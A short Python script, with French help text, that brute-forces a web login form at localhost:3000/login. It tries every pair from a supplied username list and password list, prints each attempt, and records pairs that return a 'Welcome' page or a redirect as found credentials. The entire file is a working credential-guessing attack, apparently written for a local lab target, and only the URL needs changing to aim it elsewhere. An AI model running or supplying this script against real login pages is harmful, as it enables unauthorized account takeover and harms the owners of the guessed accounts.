#!/usr/bin/env python3
import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-U", "--userlist", required=True, help="fichier usernames")
parser.add_argument("-P", "--passlist", required=True, help="fichier passwords")
args = parser.parse_args()

url = "http://localhost:3000/login"

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
}

creds_found = {}

with open(args.userlist) as ufile, open(args.passlist) as pfile:
    for user in ufile:
        user = user.strip()
        for pwd in pfile:
            pwd = pwd.strip()
            data = f"username={user}&password={pwd}"
            r = requests.post(url, headers=headers, data=data, allow_redirects=False)
            print(f"[TRY] {user}:{pwd}")
            if "Welcome" in r.text or r.status_code == 302:
                creds_found[user] = pwd
        pfile.seek(0)

print()
print()
print()
if creds_found:
    print(f"Credentials found: {creds_found}")
else:
    print("No credentials found")



